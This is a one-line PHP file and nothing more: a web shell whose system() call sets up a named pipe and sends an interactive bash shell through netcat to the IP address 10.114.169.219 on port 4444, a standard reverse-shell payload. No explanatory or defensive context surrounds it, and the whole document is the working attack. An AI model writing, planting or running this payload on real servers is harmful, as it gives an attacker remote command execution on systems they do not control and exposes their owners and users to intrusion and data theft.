<?php system ('rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.114.169.219 4444 > /tmp/f');?>
